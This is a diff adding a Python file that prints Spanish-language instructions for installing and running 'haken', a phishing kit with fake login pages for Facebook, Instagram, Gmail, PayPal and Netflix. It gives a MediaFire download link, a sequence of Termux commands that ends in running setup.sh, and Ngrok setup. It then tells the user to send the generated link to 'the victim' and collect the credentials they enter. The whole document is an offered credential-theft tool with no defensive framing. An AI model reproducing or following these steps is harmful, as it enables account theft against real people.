@@ -1,0 +1,45 @@
+print("""
+\033[1;31m¿Qué es haken?
+
+\033[1;39mhaken es un script de phishing con pocas plantillas pero muy actualizadas y recomendables por un servidor, esas plantillas son: Facebook, Instagram, Gmail, PayPal, Netflix.
+
+\033[1;33mINSTALACIÓN DE haken EN TERMUX
+
+\033[1;36mDescarga el siguiente archivo: \033[1;39mhttps://www.mediafire.com/file/8v9h5gu1twwg22h/haken.zip/file
+
+Una vez que hayas descargado el archivo, abre tu terminal "Termux" y escribe los siguientes comandos:
+
+apt update && apt upgrade -y
+
+termux-setup-storage
+
+cd /sdcard/download
+
+mv haken.zip $HOME
+
+cd
+
+unzip haken.zip
+
+cd haken
+
+bash setup.sh
+
+Aquí tienes que esperar un momento hasta que se configuren los archivos necesarios para usar y también se descargara Ngrok automaticamente asi que no debes preocuparte por instalarlo, lo único que necesitas es el Authtoken de tu cuenta Ngrok.
+
+Terminando de instalar Ngrok, te pedira que escribas tu Authtoken, solo debes copiarlo, pegarlo y después pulsar Enter.
+
+
+Aquí ya estaria listo, para usar, solo debes escribir el número de el phishing que vayas a usar y pulsar enter, Ejemplo:
+
+Se te abrira la sesión de Ngrok en la cual debes copiar uno de los enlaces generados y enviarlo a la víctima, cuando la víctima introduzca sus datos en la página phishing, podrás ver esos datos cerrando Ngrok con las teclas:
+
+\033[1;30mCtrl + C
+
+\033[1;39mY después pulsa de nuevo las teclas:
+
+\033[1;30mCtrl + C
+
+\033[1;39mInfo: [ https://informaticayhacking.cf/haken.html ]
+""")
+
